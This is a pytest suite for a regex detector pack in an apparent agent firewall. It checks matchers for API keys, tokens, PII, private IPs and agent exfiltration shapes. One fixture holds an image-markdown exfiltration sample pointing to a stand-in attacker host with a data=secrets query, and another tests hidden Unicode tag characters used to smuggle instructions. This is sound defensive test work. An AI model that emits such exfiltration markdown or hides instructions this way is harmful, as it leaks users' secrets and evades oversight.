"""Tests for the regex pack detector (§6.1 of AGENT_FIREWALL_SPEC.md).

Each pattern gets at least one positive sample (matches expected) and
one negative sample (doesn't match). Critical for the bypass log
mining later — an OWASP-LLM-Top-10 starter rule that calls
``looks_like_secret(output)`` depends on these matchers being correct.

Convention: secret-shaped fixtures are assembled at runtime (concat
of the prefix and a body string) so GitHub secret scanning + push
protection don't flag literal source. The regex still sees the
fully-assembled string. New patterns added here MUST follow this —
do not paste literal example tokens into source.
"""

from __future__ import annotations

import pytest

from firewall.detectors import regex_pack as rp


# ----- AWS / cloud -------------------------------------------------------


@pytest.mark.parametrize("token", [
    "AKIAIOSFODNN7EXAMPLE",
    "ASIAQ4P7EXAMPLE12345",
    "AROAQ4P7EXAMPLE12345",
])
def test_aws_access_key_id_matches(token):
    assert rp.PATTERNS["aws_access_key_id"].search(token)


def test_aws_access_key_id_does_not_match_random():
    assert rp.PATTERNS["aws_access_key_id"].search("AKIA-NOT-A-KEY") is None
    assert rp.PATTERNS["aws_access_key_id"].search("hello world") is None


def test_aws_secret_access_key_with_entropy():
    high_entropy = "wJalrXUtn" + "FEMI/K7MDENG/" + "bPxRfiCYEXAMPLEKEY"
    found = rp.secrets_in(high_entropy)
    kinds = {k for k, _ in found}
    assert "aws_secret_access_key_shape" in kinds


def test_aws_secret_access_key_low_entropy_filtered():
    """A 40-char shape with low entropy is filtered out — prose
    isn't a secret."""
    low_entropy = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    found = rp.secrets_in(low_entropy)
    kinds = {k for k, _ in found}
    assert "aws_secret_access_key_shape" not in kinds


def test_gcp_api_key():
    fixture = "AIza" + "SyDdI0hCZtE6" + "vySjMm-WEfRq3CPzqKqqsHI"
    assert rp.PATTERNS["gcp_api_key"].search(fixture)


# ----- Source-control PATs -----------------------------------------------


@pytest.mark.parametrize("token", [
    "ghp_" + "a" * 36,
    "ghs_" + "x" * 40,
    "gho_" + "B" * 36,
])
def test_github_pat(token):
    assert rp.PATTERNS["github_pat"].search(token)


def test_gitlab_pat():
    assert rp.PATTERNS["gitlab_pat"].search("glpat-abcdefghij1234567890_-")


# ----- Provider keys -----------------------------------------------------


def test_openai_key():
    fixture = "sk" + "-" + "abcdefghijklmnopqrstuvwxyz0123456789"
    assert rp.PATTERNS["openai_api_key"].search(fixture)


def test_anthropic_key():
    fixture = "sk" + "-ant-api01-" + "abc123_def-456"
    assert rp.PATTERNS["anthropic_api_key"].search(fixture)


def test_stripe_secret():
    # Synthesize the test fixtures at runtime so GitHub's push-protection
    # secret scanner doesn't flag literal Stripe-shaped strings in source.
    body = "abc123def456ghi789jkl012"
    assert rp.PATTERNS["stripe_secret_key"].search("sk_" + "live_" + body)
    assert rp.PATTERNS["stripe_secret_key"].search("sk_" + "test_" + body)


def test_generic_api_key_with_entropy():
    """High-entropy generic API key matches; low-entropy 'api_key=hello
    world' filtered by the entropy check."""
    high = 'api_key="K3p9F2nXaQ8sW1v_RmY7uV4tH6"'
    low = 'api_key="example placeholder"'
    assert rp.looks_like_secret(high)
    # Prose-shaped placeholder shouldn't trip
    assert not rp.looks_like_secret(low)


# ----- JWTs --------------------------------------------------------------


def test_jwt():
    sample = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0."
        "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    found = rp.secrets_in(sample)
    kinds = {k for k, _ in found}
    assert "jwt" in kinds


def test_not_a_jwt():
    """Random hex shouldn't be classified as a JWT."""
    assert not rp.looks_like_secret("abc123def456 not a real token")


# ----- PII shapes --------------------------------------------------------


def test_us_ssn():
    found = rp.regex_pii_scan("My SSN is 123-45-6789, please don't leak it.")
    kinds = {k for k, _ in found}
    assert "us_ssn" in kinds


def test_credit_card_with_luhn():
    """4111-1111-1111-1111 is the canonical Visa test number — Luhn-valid."""
    found = rp.regex_pii_scan("Card on file: 4111 1111 1111 1111.")
    kinds = {k for k, _ in found}
    assert "credit_card_shape" in kinds


def test_credit_card_invalid_luhn_filtered():
    """A 16-digit shape that fails Luhn (one digit off the test number)
    must NOT be flagged — that's the discriminator."""
    found = rp.regex_pii_scan("Order ID: 4111 1111 1111 1112")
    kinds = {k for k, _ in found}
    assert "credit_card_shape" not in kinds


def test_credit_card_zeros_filtered():
    """All-zeros 16-digit string is technically Luhn-valid (sum = 0)
    but is clearly not a real card number — caught by the all-zeros
    guard in luhn_valid()."""
    found = rp.regex_pii_scan("dummy: 0000 0000 0000 0000")
    kinds = {k for k, _ in found}
    assert "credit_card_shape" not in kinds


def test_phone_us_format():
    found = rp.regex_pii_scan("Call me at (415) 555-1234 or +1-415-555-9876.")
    kinds = {k for k, _ in found}
    assert "phone_nanp" in kinds


def test_email():
    found = rp.regex_pii_scan("Contact: amit@example.com")
    kinds = {k for k, _ in found}
    assert "email" in kinds


# ----- Network identifiers -----------------------------------------------


def test_private_ipv4():
    """Private IPs should match — used for SSRF detection on
    web_fetch URL args."""
    for ip in ["10.0.0.1", "172.16.5.10", "192.168.1.100", "127.0.0.1", "169.254.169.254"]:
        assert rp.PATTERNS["private_ipv4"].search(ip), f"{ip} should match"


def test_public_ipv4_does_not_match_private_pattern():
    for ip in ["8.8.8.8", "1.1.1.1"]:
        assert rp.PATTERNS["private_ipv4"].search(ip) is None, f"{ip} matched private"


# ----- Agent-specific exfil shapes ---------------------------------------


def test_image_markdown_exfil():
    """The canonical image-markdown exfiltration shape — used by
    Bing/Copilot/ChatGPT exfil writeups in 2024."""
    sample = "Here's the result: ![spinner](https://attacker.tld/?data=secrets)"
    assert rp.has_image_markdown_exfil(sample)


def test_image_markdown_without_query_not_flagged():
    """Legitimate image markdown without a query string isn't exfil."""
    sample = "![logo](https://example.com/logo.png)"
    assert not rp.has_image_markdown_exfil(sample)


def test_ascii_smuggling_unicode_tag_chars():
    """Hidden Unicode tag characters (U+E0000 to U+E007F) used to smuggle
    instructions inside otherwise-normal-looking prose."""
    # U+E0001 is a Unicode tag character
    sample = "Hello\U000E0001 there"
    assert rp.has_ascii_smuggling(sample)


def test_no_ascii_smuggling_in_normal_text():
    assert not rp.has_ascii_smuggling("Hello there, how are you today?")


# ----- Helper functions --------------------------------------------------


def test_luhn_valid_canonical():
    assert rp.luhn_valid("4111111111111111")  # Visa test
    assert rp.luhn_valid("5500-0000-0000-0004")  # MasterCard test (with separators)
    assert not rp.luhn_valid("4111111111111112")  # one digit off
    assert not rp.luhn_valid("0000000000000000")  # all zeros guard
    assert not rp.luhn_valid("123")  # too short
    assert not rp.luhn_valid("1" * 25)  # too long


def test_shannon_entropy_buckets():
    """Sanity check on the entropy threshold used to discriminate
    secrets from prose."""
    # English prose: low entropy
    prose = "the quick brown fox jumps over the lazy dog"
    assert rp.shannon_entropy(prose) < 5.0
    # Base64-shaped secret: high entropy
    secret = "wJalrXUtn" + "FEMI/K7MDENG/" + "bPxRfiCYEXAMPLEKEY"
    assert rp.shannon_entropy(secret) > 4.5


def test_regex_match_safe_on_bad_input():
    """Rule 7: builtins never raise. Bad regex pattern returns False."""
    assert rp.regex_match("foo", r"[invalid") is False
    assert rp.regex_match("", r"foo") is False
    assert rp.regex_match(None, r"foo") is False


def test_regex_extract_returns_first_match():
    assert rp.regex_extract("hello WORLD foo", r"WORLD") == "WORLD"
    # When there's a group, return group 1
    assert rp.regex_extract("pre[token]post", r"\[(\w+)\]") == "token"
    # No match → None
    assert rp.regex_extract("hello", r"xyz") is None


def test_secrets_in_returns_kinds_and_matches():
    sample = "GitHub PAT: ghp_" + "x" * 36 + " — keep secret."
    found = rp.secrets_in(sample)
    kinds = {k for k, _ in found}
    assert "github_pat" in kinds
    # The matched value should contain the actual token
    pat_match = next(v for k, v in found if k == "github_pat")
    assert pat_match.startswith("ghp_")


def test_empty_input_safe():
    assert rp.secrets_in("") == []
    assert rp.secrets_in(None) == []
    assert rp.regex_pii_scan(None) == []
    assert rp.has_image_markdown_exfil(None) is False
    assert rp.has_ascii_smuggling(None) is False


# ----- Performance smoke test --------------------------------------------


def test_scan_10kb_input_under_50ms():
    """The spec says <2ms for 10KB. Use 50ms here as a non-flaky
    upper bound — actual perf is well under but CI machines vary."""
    import time
    big = "this is plain text without any secrets " * 256  # ~10KB
    start = time.monotonic()
    rp.secrets_in(big)
    rp.regex_pii_scan(big)
    elapsed_ms = (time.monotonic() - start) * 1000
    assert elapsed_ms < 50, f"regex pack took {elapsed_ms:.1f}ms"
